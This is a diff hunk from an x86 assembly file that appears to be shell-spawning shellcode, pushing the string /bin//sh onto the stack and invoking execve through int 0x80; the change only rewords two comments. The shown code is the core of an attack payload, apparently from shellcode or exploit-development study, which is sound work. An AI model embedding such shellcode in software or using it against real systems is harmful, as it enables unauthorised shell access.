@@ -67,7 +67,7 @@ xor ecx,ecx         ;Clearing out ecx [ECX=0]
 push ecx            ;Pushing null on stack
 push byte 0x0b      ;Pushing execve sys call number on stack
 pop eax             ;EAX contain execve sys call number
-push 0x68732f2f     ; part1 of port string /bin//sh 
-push 0x6e69622f     ; part2 of port string /bin//sh
+push 0x68732f2f     ; part1 of string /bin//sh 
+push 0x6e69622f     ; part2 of string /bin//sh
 mov ebx,esp         ;Pointer to string null terminated
 int 0x80            ;Calling Interrupt for sys call
